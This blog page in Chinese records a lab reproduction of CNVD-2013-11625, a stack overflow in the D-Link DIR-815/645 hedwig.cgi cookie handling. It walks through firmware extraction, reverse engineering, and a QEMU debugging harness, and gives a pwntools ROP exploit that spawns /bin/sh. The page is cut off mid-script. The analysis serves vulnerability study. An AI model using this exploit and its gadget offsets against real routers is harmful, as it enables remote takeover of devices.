@@ -1,0 +1,612 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CNVD-2013-11625复现记录 | Icyice's Corner</title><meta name="author" content="Icyice"><meta name="copyright" content="Icyice"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CNVD-2013-11625复现记录记录复现漏洞的学习过程 0x00 漏洞信息 D-Link DIR-645是一款无线路由器设备。 D-Link DIR-645 “post_login.xml”，”hedwig.cgi”，”authentication.cgi” 不正确过滤用户提交的参数数据，允许远程攻击者利用漏洞提交特制请求触发缓冲区溢出，可使应用程序停止响应，造成拒绝服务攻击。  0x01">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CNVD-2013-11625复现记录">
+<meta property="og:url" content="http://example.com/2026/04/14/2026414-CNVD-2013-11625%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="Icyice&#39;s Corner">
+<meta property="og:description" content="CNVD-2013-11625复现记录记录复现漏洞的学习过程 0x00 漏洞信息 D-Link DIR-645是一款无线路由器设备。 D-Link DIR-645 “post_login.xml”，”hedwig.cgi”，”authentication.cgi” 不正确过滤用户提交的参数数据，允许远程攻击者利用漏洞提交特制请求触发缓冲区溢出，可使应用程序停止响应，造成拒绝服务攻击。  0x01">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/OIF-C.webp">
+<meta property="article:published_time" content="2026-04-13T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-14T14:27:28.605Z">
+<meta property="article:author" content="Icyice">
+<meta property="article:tag" content="CVE复现学习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/OIF-C.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CNVD-2013-11625复现记录",
+  "url": "http://example.com/2026/04/14/2026414-CNVD-2013-11625%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/",
+  "image": "http://example.com/img/OIF-C.webp",
+  "datePublished": "2026-04-13T16:00:00.000Z",
+  "dateModified": "2026-04-14T14:27:28.605Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Icyice",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/I.jpg"><link rel="canonical" href="http://example.com/2026/04/14/2026414-CNVD-2013-11625%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CNVD-2013-11625复现记录',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/OII.jpg);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/20191107212822_gyqlp.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/I.jpg" alt="Logo"><span class="site-name">Icyice's Corner</span></a><a class="nav-page-title" href="/"><span class="site-name">CNVD-2013-11625复现记录</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">CNVD-2013-11625复现记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-13T16:00:00.000Z" title="发表于 2026-04-14 00:00:00">2026-04-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-14T14:27:28.605Z" title="更新于 2026-04-14 22:27:28">2026-04-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">7.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>33分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2026-04-14 22:27:28&quot;}" hidden></div><h1 id="CNVD-2013-11625复现记录"><a href="#CNVD-2013-11625复现记录" class="headerlink" title="CNVD-2013-11625复现记录"></a>CNVD-2013-11625复现记录</h1><p>记录复现漏洞的学习过程</p>
+<h1 id="0x00-漏洞信息"><a href="#0x00-漏洞信息" class="headerlink" title="0x00 漏洞信息"></a>0x00 漏洞信息</h1><blockquote>
+<p>D-Link DIR-645是一款无线路由器设备。</p>
+<p>D-Link DIR-645 “post_login.xml”，”hedwig.cgi”，”authentication.cgi” 不正确过滤用户提交的参数数据，允许远程攻击者利用漏洞提交特制请求触发缓冲区溢出，可使应用程序停止响应，造成拒绝服务攻击。</p>
+</blockquote>
+<h1 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h1><p>固件下载地址:<a target="_blank" rel="noopener" href="https://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/">legacyfiles.us.dlink.com - &#x2F;DIR-815&#x2F;REVA&#x2F;FIRMWARE&#x2F;</a>（进去后下载版本最低的 DIR-815_REVA_FIRMWARE_v1.01.ZIP，需要挂梯子）</p>
+<p>安装binwalk 的 sasquatch 工具 ：<a target="_blank" rel="noopener" href="https://www.uf4te.cn/posts/e9324890.html">IoT环境搭建与固件分析 | 坠入星野的月🌙</a></p>
+<p>IDA插件mipsrop（用于搜寻Mips架构下的gadget）：<a target="_blank" rel="noopener" href="https://github.com/zhefox/MipsROPSeracher-python3">zhefox&#x2F;MipsROPSeracher-python3: A tool for search MipsROPChain in python3</a></p>
+<h2 id="需要了解到的mips架构下的相关知识"><a href="#需要了解到的mips架构下的相关知识" class="headerlink" title="需要了解到的mips架构下的相关知识:"></a>需要了解到的mips架构下的相关知识:</h2><p>（注：这里直接搬运了两位师傅博客里的讲解：[CNVD-2013-11625 DIR-815 栈溢出漏洞 | Hexo](<a target="_blank" rel="noopener" href="https://khighl.github.io/2025/06/11/CNVD-2013-11625">https://khighl.github.io/2025/06/11/CNVD-2013-11625</a>  DIR-815 栈溢出漏洞&#x2F;) 和 <a target="_blank" rel="noopener" href="https://gggtaotao.github.io/post/376f79f0.html">CNVD-2013-11625 | 云梦</a>）</p>
+<p>mips架构两个很有意思的特性是</p>
+<ul>
+<li><p>在调用叶子函数和非叶子函数时对于寄存器的处理问题</p>
+</li>
+<li><p>流水线指令集的相关特性，主要体现在“分支延迟效应”和“缓存不一致性”</p>
+</li>
+</ul>
+<h3 id="函数特性"><a href="#函数特性" class="headerlink" title="函数特性"></a>函数特性</h3><p>叶子函数</p>
+<ul>
+<li>当一个函数内部,没有调用其他函数时，这个函数称为叶子函数<ul>
+<li>叶子函数的返回地址在被调用时便存储在$ra中，函数返回时直接通过jr $ra跳回</li>
+</ul>
+</li>
+</ul>
+<p>非叶子函数</p>
+<ul>
+<li>当一个函数调用了其他函数时，这个函数称为非叶子函数</li>
+<li>非叶子函数的返回地址会在程序开始（prologue）通过sw被存贮在栈上，在函数结束（epilogue）返回时会通过lw操作将返回地址弹回$ra,再jr $ra返回</li>
+<li>只有非叶子函数可以通过栈溢出覆盖返回地址</li>
+</ul>
+<p>如果在某个函数中使用到了 $s0 ~ $s7中的某些保存寄存器（包括$fp） ，则也会在prologue处保存下来，并在epilogue处取出。</p>
+<p>需要注意的是，$s0 ~ $s7, $fp, $sp在栈中存放的地址依次递增，因此，很容易想到，我们可以在栈溢出的同时，顺带着控制到$s0 ~ $s7的值。</p>
+<p>或者说，如果某些函数在调用过程中使用了$ *寄存器，它也会先通过sw操作将这些寄存器原本的值存在栈上，在返回时lw恢复寄存器的值</p>
+<p>所以通过栈溢出我们不仅可以控制返回地址，还可以控制大量的寄存器。</p>
+<h3 id="流水线指令集特性"><a href="#流水线指令集特性" class="headerlink" title="流水线指令集特性"></a>流水线指令集特性</h3><ul>
+<li>在 MIPS 架构中，当你执行一条 跳转（如 j &#x2F; jalr）或条件分支（如 beq &#x2F; bne）指令时,**跳转&#x2F;分支发生后，**仍然会执行紧接着的下一条指令（也就是那一行代码！），无论是否跳转成功！</li>
+<li>在 MIPS 架构中，由于其支持 数据缓存（D-Cache） 和 指令缓存（I-Cache），这两个缓存是连个独立的,对内存的映射,当我们将shellcode写入栈中,数据缓存中的内容已经被更新成了我们写入的shellcode,但是指令缓存中的内容仍然是栈中原本的数据,如果此时就跳转会导致shellcode未被执行.保险起见,我们可以调用sleep函数给予这两个缓存足够的时间同步</li>
+</ul>
+<h2 id="提取固件："><a href="#提取固件：" class="headerlink" title="提取固件："></a>提取固件：</h2><p>使用 binwalk -Me 分离出文件系统：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me ./DIR-815A1_FW101SSB03.bin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/image-20260414220326499.png"></p>
+<p>我们就会得到一个完整的文件系统</p>
+<p><img src="/./../images/image-20260414220424347.png"></p>
+<p>找寻官方说漏洞所在文件”hedwig.cgi”，注意自身的目录所在</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name <span class="string">&quot;hedwig.cgi&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/image-20260414220435680.png"></p>
+<p>发现它仅仅是一个指向上级目录中elf文件的软链接，那就将指向的&#x2F;htdocs&#x2F;cgibin拿出来逆向分析</p>
+<p><img src="/./../images/image-20260414220441395.png"></p>
+<h1 id="0x02-逆向分析"><a href="#0x02-逆向分析" class="headerlink" title="0x02 逆向分析"></a>0x02 逆向分析</h1><p>把cgibin丢进IDA里</p>
+<p>在main()里找到hedwig.cgi</p>
+<p><img src="/./../images/image-20260414220451161.png"></p>
+<p>进去hedwigcgi_main()之后<br> <img src="/./../images/image-20260414220459194.png"></p>
+<p>它先是读取环境变量REQUEST_METHOD，要求必须是POST请求，如果是，就进入cgibin_parse_request()</p>
+<p><img src="/./../images/image-20260414220509787.png"></p>
+<p>cgibin_parse_request()这个函数会使用一参的函数指针对url进行处理，提取出几个环境变量，这几个变量对和栈溢出关系不大,但是不能没有，否则不会进行下去。</p>
+<p><img src="/./../images/image-20260414220521266.png"></p>
+<p>接着往下走，就到了sess_get_uid()，这个函数会提取出cookie</p>
+<p><img src="/./../images/image-20260414220528201.png"></p>
+<p>将cookie以”&#x3D;”为界分割为两段,前一段存贮在v2结构体中,后一段存储在v4结构体中</p>
+<p><img src="/./../images/image-20260414220537250.png"></p>
+<p>然后比较第一部分是不是”uid”,如果是的话将第二部分拼接到a1中(a1为在main函数中通过sobj_new()创建的结构体,初始内容为空)</p>
+<p><img src="/./../images/image-20260414220548729.png"></p>
+<p>返回后，hedwigcgi_main()函数调用了sprintf()，没有检查cookie的长度，这里的string就是v4中的字符串，也就是cookie中uid&#x3D;之后的内容，是可以由用户自由控制的，然而v27数组的大小仅有1024，因此，很容易造成缓冲区溢出。</p>
+<p><img src="/./../images/image-20260414220656784.png"></p>
+<p>造成了第一次栈溢出,但是我们接着往下看会发现在两个检测后还有一个sprintf的栈溢出，且在这个过程中strings的内容是没有发生变化的，因为仍然是v27数组的溢出，两次拼接的字符串又一样，所以这里能覆盖上一次sprintf的内容。</p>
+<p>如果要到第二个sprintf的话，就需要过这两个判断：</p>
+<p><img src="/./../images/image-20260414220705034.png"></p>
+<p>这第一个判断需要有&#x2F;var&#x2F;tmp这个目录，这个在真机上是有的，因此为了更真实地模拟环境，我们需要在解压后得到的文件系统内创建一个&#x2F;var&#x2F;tmp文件夹，这样cgibin才能在此路径下创建temp.xml文件用于数据的写入。</p>
+<p>第二个判断haystack的值，那我们就看看那里会改动haystack，</p>
+<p><img src="/./../images/image-20260414220711385.png"></p>
+<p>其中有四个交叉引用都是对haystack进行lw(加载)操作,只有一处是对它的sw(保存)</p>
+<p>说明只有最后一处是对haystack的赋值</p>
+<p><img src="/./../images/image-20260414220716970.png"></p>
+<p>只要这个函数被调用，haystack就会被赋值，所以我们现在开始查找对这个函数的交叉引用。</p>
+<p>在这判断语句之前，只有cgibin_parse_request()的第一个参数sub_409A6C()中可对其操作：</p>
+<p>那就回过头去，再细细分析cgibin_parse_request()的逻辑，主要想法就是去看哪里用到了第一个参数sub_409A6C()，即这里的变量a1</p>
+<p>就在这个嵌套循环部分里，会先调用off_42C014[2]也就是sub_403B10()函数</p>
+<p><img src="/./../images/image-20260414220723066.png"></p>
+<p><img src="/./../images/image-20260414220729374.png"></p>
+<p>接着进去看sub_403B10()</p>
+<p><img src="/./../images/image-20260414220739673.png"></p>
+<p>这里的a4是&amp;v14[12]，即CONTENT_TYPE[12]，环境变量未被比较的那部分,如果与”x-www-form-urlencoded”相同,则调用sub_402FFC(a1)</p>
+<p>到这一步，需要牢记我们的目标是什么，是想要抓住第一个参数sub_409A6C()也就是a1</p>
+<p>哪里调用到了我们的sub_409A6C()（也就是a1）我们就往哪里走，所以这一步的条件判断是我们需要满足使其成立的</p>
+<p>进一步走到sub_402FFC()后，并没有找到关于a1的调用，但是调用了sub_402B40()，它的参数是对sub_403B10()中的int变量的取地址,那么它</p>
+<p>就有可能会访问到sub_403B10()中的其他参数</p>
+<p><img src="/./../images/image-20260414220749208.png"></p>
+<p>在sub_402B40()里发现了，对函数指针的调用，其中在sub_402B40()的a1就是sub_403B10()的v11的地址，以此为基址，3为偏移进行了解引用</p>
+<p><img src="/./../images/image-20260414220800754.png"></p>
+<p>回到sub_403B10()中观察几个变量的相对位置，会发现sub_402B40()的a1[3]就是sub_403B10()的v14，而sub_402FFC()的第一个参数就是sub_409A6C()，它被赋给了v14</p>
+<p><img src="/./../images/image-20260414220809678.png"></p>
+<p>所以到这里我们想要控制全局变量haystack不为0，来绕过检查，只需要满足CONTENT_TYPE&#x3D;”application&#x2F;“+”x-www-form-urlencoded”&#x3D;”application&#x2F;x-www-form-urlencoded”</p>
+<p>那接下来终于顺利走到了栈溢出的部分了</p>
+<p><img src="/./../images/image-20260414220818356.png"></p>
+<p>但是在写脚本的时候还要注意的是</p>
+<p>在sub_402FFC()中有对POST_content的内容的读取,读取后在sub_402B40(&amp;v11, (int)buf_1, v8)中处理(POST_content读入了buf_1)</p>
+<p><img src="/./../images/image-20260414220828468.png"></p>
+<p>这里对POST_content的处理方式与对cookie的处理方式相似，也是初始化了两个结构体，将&#x3D;前后的内容分别读入两个结构体，然后判断这两个结构体中的内容是否不为空</p>
+<p><img src="/./../images/image-20260414220834663.png"></p>
+<p><img src="/./../images/image-20260414220840880.png"></p>
+<p>所以POST_content必须满足^(.+?)&#x3D;(.+)$</p>
+<blockquote>
+<p>整个 POST_content 必须是 键&#x3D;值 格式，键和值都不能为空，并且 只允许出现一个等号。</p>
+</blockquote>
+<h1 id="0x03-编写exp"><a href="#0x03-编写exp" class="headerlink" title="0x03 编写exp"></a>0x03 编写exp</h1><blockquote>
+<p>MIPS架构下的栈溢出肯定也是需要通过构造ROP链来getshell的，不过由于MIPS有个特性，即无法开NX保护，这样就有了两种构造ROP链的方式：第一种就是纯ROP链，通过调用system函数来getshell；第二种就是通过构造ROP链，跳转至读入到栈&#x2F;bss段等处的shellcode执行。在实际应用中，最常用的还是通过ROP + shellcode的方式来getshell。</p>
+</blockquote>
+<h2 id="QEMU-用户级复现"><a href="#QEMU-用户级复现" class="headerlink" title="QEMU 用户级复现"></a>QEMU 用户级复现</h2><blockquote>
+<p>QEMU 用户级层面的漏洞复现不需要进行仿真，但相比之下，需要进行仿真的系统级复现更加直观、更符合现实场景，这里主要是介绍 QEMU 用户级层面的漏洞复现方式</p>
+</blockquote>
+<p>IDA静态分析结束，接下来可以用gdb来调试，顺便验证一下IDA里显示的溢出长度是否正确</p>
+<p>首先打开虚拟机的路由器文件系统根目录</p>
+<p>生成 2000 个字符的 payload 文件，用来测试 uid 溢出到栈上返回地址所需的字节数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic 2000 &gt; payload</span><br></pre></td></tr></table></figure>
+
+<p>创建以下 run.sh 脚本，通过 QEMU 用户模式启动 &#x2F;htdocs&#x2F;cgibin 程序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">INPUT=<span class="string">&quot;icyice=pwner&quot;</span>                                    <span class="comment">#创建INPUT变量作为POST_content,满足^(.+?)=(.+)$</span></span><br><span class="line">LEN=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$INPUT</span>&quot;</span> | <span class="built_in">wc</span> -c)                         <span class="comment">#计算$INPUT的长度</span></span><br><span class="line">cookie=<span class="string">&quot;uid=`cat payload`&quot;</span>                              <span class="comment">#将cookie设置为uid=&#123;payload&#125;,payaload中是&#x27;a&#x27;*2000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$INPUT</span> | qemu-mipsel-static -L ./ -0 <span class="string">&quot;hedwig.cgi&quot;</span> \       <span class="comment">#通过管道符(|)将$INPUT作为POST_context传输给./htdocs/cgibin,并设置agrv[0]=&quot;hedwig.cgi&quot;</span></span><br><span class="line">  -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> \                            <span class="comment">#指定请求方式为POST</span></span><br><span class="line">  -E CONTENT_LENGTH=<span class="variable">$LEN</span> \                              <span class="comment">#设置LENTH环境变量</span></span><br><span class="line">  -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> \ <span class="comment">#设置CONTENT_TYPE环境变量为刚刚逆向分析得到的字符串</span></span><br><span class="line">  -E HTTP_COOKIE=<span class="variable">$cookie</span> \                              <span class="comment">#设置cookie环境变量为设置好的载荷</span></span><br><span class="line">  -E REQUEST_URI=<span class="string">&quot;2333&quot;</span> \                               <span class="comment">#设置REQUEST_URI环境变量为2333(只要不为空即可)</span></span><br><span class="line">  -g 1234 \                                             <span class="comment">#开发1234端口等待gdb连接</span></span><br><span class="line">  ./htdocs/cgibin                                       <span class="comment">#指定运行的elf为目标文件</span></span><br></pre></td></tr></table></figure>
+
+<p>运行run.sh脚本，此时我们在另一个端口开gdb连接1234端口，即可开始对.&#x2F;htdocs&#x2F;cgibin进行远程调试</p>
+<p>可以看到本机开启了 1234 端口：</p>
+<p><img src="/./../images/image-20260414220849951.png"></p>
+<p>然后使用本机的 gdb-multiarch 连接 gdbserver：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">(gdb-multiarch) <span class="built_in">set</span> architecture mips</span><br><span class="line">(gdb-multiarch) target remote 127.0.0.1:1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/image-20260414220855999.png"></p>
+<p>此时我们进入了调试界面，但是发现 QEMU 用户模式连上 pwndbg 时，vmmap  无法看到 libc 的基地址</p>
+<p><img src="/./../images/image-20260414220902381.png"></p>
+<p>这个设备是没有开ALSR保护，所以libc固定，我们想要获取libc可以通过查询已经完成延迟绑定的got表计算libc_base</p>
+<p><img src="/./../images/image-20260414220908290.png"></p>
+<p>这里找到strcmp的libc真实地址，在路由器文件系统的 &#x2F;lib 文件夹内，找到其所使用的 libc 文件：libc.so.0</p>
+<p>利用 objdump 查找 memset() 函数的偏移地址：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -T ./libc.so.0 | grep strcmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/image-20260414220914090.png"></p>
+<p>则 libc 基地址为：0x3ff6cd10 - 0x34d10 &#x3D; 0x3ff38000（如果计算结果最后三位不是 000 的话，那就说明算错了）</p>
+<p>接下来就是 GDB 执行到 hedwigcgi_main() 函数结束将要返回的地方，观察返回地址来确定溢出的长度：</p>
+<p><img src="/./../images/image-20260414220919931.png"></p>
+<p>我直接按c到溢出部分，显示返回地址 0x646b6161 不合法，cyclic -l 得到溢出到返回地址的长度为 1009</p>
+<p><img src="/./../images/image-20260414220925389.png"></p>
+<h3 id="向用户态-QEMU-传递-payload-参数"><a href="#向用户态-QEMU-传递-payload-参数" class="headerlink" title="向用户态 QEMU 传递 payload 参数"></a>向用户态 QEMU 传递 payload 参数</h3><blockquote>
+<p>由于 QEMU 用户级复现不需要仿真，我们只需要用 qemu-mipsel-static 运行 &#x2F;htdocs&#x2F;cgibin 程序，然后将 payload 作为参数传递</p>
+</blockquote>
+<p>poc 如下：</p>
+<h4 id="1-纯-ROP-链，即构造-system-“-bin-sh”-来-getshell"><a href="#1-纯-ROP-链，即构造-system-“-bin-sh”-来-getshell" class="headerlink" title="1. 纯 ROP 链，即构造 system(“&#x2F;bin&#x2F;sh”) 来 getshell"></a>1. 纯 ROP 链，即构造 system(“&#x2F;bin&#x2F;sh”) 来 getshell</h4><p>这里是system地址末两位是\x00，而sprintf会被\x00截断，因此采用的方法是：读进去system_addr - 1，再找到addiu …, 1的gadget对其操作后再跳转过去。</p>
+<p>利用mipsrop(<a target="_blank" rel="noopener" href="https://github.com/zhefox/MipsROPSeracher-python3">zhefox&#x2F;MipsROPSeracher-python3: A tool for search MipsROPChain in python3</a>)来寻找所需的gadget</p>
+<p>里面的stackfinder()&#x2F;tail()&#x2F;system()等选项很便于寻找一些gadget，也可以使用如mipsrop.find(“li .*, 1”)的形式，通过.*进行模糊匹配：</p>
+<p><img src="/./../images/image-20260414220933727.png"></p>
+<p>在python栏中输入相关语法查找所需的gadget，这里已经拿到了libc_base，可以在libuClibc-0.9.30.1.so文件里找</p>
+<p><img src="/./../images/image-20260414220940819.png"></p>
+<p><img src="/./../images/image-20260414220947177.png"></p>
+<p><img src="/./../images/image-20260414220955291.png"></p>
+<p>exp如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;mips&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="number">0x3ff38000</span></span><br><span class="line">system = libc_base + <span class="number">0x53200</span></span><br><span class="line">bin_sh = libc_base+ <span class="number">0x5a448</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += p32(system - <span class="number">1</span>) <span class="comment"># s0  system_addr - 1</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x159F4</span>) <span class="comment"># s1  move $t9, $s0 (=&gt; jalr $t9)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(bin_sh) <span class="comment"># s3</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">2</span>) <span class="comment"># s4 | s5</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x32A98</span>) <span class="comment"># s6  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">2</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x13F8C</span>) <span class="comment"># ra  move $a0, $s3 (=&gt; jalr $s6)</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&quot;uid=&quot;</span> + payload</span><br><span class="line">post_content = <span class="string">&quot;icyice=pwner&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    qemu-mipsel-static -L ./ \</span></span><br><span class="line"><span class="string">    -0 &quot;hedwig.cgi&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_METHOD=&quot;POST&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_LENGTH=12 \</span></span><br><span class="line"><span class="string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; 